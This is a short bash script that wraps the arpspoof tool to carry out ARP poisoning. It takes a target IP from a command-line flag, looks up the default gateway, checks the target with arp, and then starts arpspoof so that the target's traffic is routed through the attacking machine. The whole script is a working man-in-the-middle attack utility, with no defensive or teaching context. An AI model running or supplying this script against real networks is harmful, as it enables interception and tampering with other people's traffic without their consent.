#!/bin/bash

open(){
read -p "What Interface do you want to use(ex: wlan0)" INT
gateway=$(/sbin/ip route | awk '/default/ { print $3}')
echo "${TARGET}"
    #ping -c 1 -t 1 ${TARGET} > /dev/null 2> /dev/null  # ping and discard output
    arp -n ${TARGET} > /dev/null 2> /dev/null #use arp instead of ping for speed
    if [ $? -eq 0 ]; then  # check the exit code
        echo "${TARGET} is up; Starting ARPspoof" # display the output
	arpspoof -i ${INT} -t ${TARGET} ${gateway} &
 	#arpspoof -i ${INT} -t ${gateway} ${TARGET} &
    else
        echo "${TARGET} is down"
    fi
}

eternalwait(){
while :
do
  sleep 5000
done
}


for i in "$@"
do
case $i in
    -t=*|--target=*)
    TARGET="${i#*=}"
    open
    ;;
    -h|--help)
    echo "-t or --target with input ip"
    echo "-h or --help to show this menu"
    shift # past argument with no value
    ;;
    *)
    echo "-t or --target with input ip"
    echo "-h or --help to show this menu"     # unknown option
    ;;
esac
done
